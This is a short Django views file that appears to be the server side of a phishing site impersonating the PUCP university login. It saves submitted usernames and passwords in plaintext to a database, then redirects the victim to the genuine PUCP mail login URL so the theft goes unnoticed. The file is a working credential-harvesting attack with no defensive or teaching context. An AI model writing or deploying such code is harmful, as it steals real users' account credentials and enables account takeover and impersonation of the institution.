from django.shortcuts import render, redirect
from .models import UserData
from django.http import HttpResponse

# Create your views here.

def home(request):

    if request.POST:
        form_data = request.POST
        new_data = UserData(username=form_data['uname'], password=form_data['psw'])
        new_data.save()
        return redirect('https://pandora.pucp.edu.pe/pucp/login?service=https%3A%2F%2Fcorreo.pucp.edu.pe%2F')

    else:
        return render(request, 'pucp_web/web.html')